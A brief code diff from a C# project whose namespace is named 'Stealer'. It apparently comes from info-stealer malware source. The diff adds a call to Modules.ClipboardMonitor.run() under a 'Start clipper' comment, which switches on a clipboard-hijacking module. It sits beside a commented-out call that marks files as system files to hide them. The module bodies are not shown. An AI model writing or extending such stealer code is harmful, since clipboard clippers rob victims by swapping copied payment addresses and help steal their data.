@@ -23,6 +23,7 @@ namespace Stealer
                Modules.Attributes.set_system(); */
 
             // Start clipper
+            Modules.ClipboardMonitor.run();
         }
     }
 }
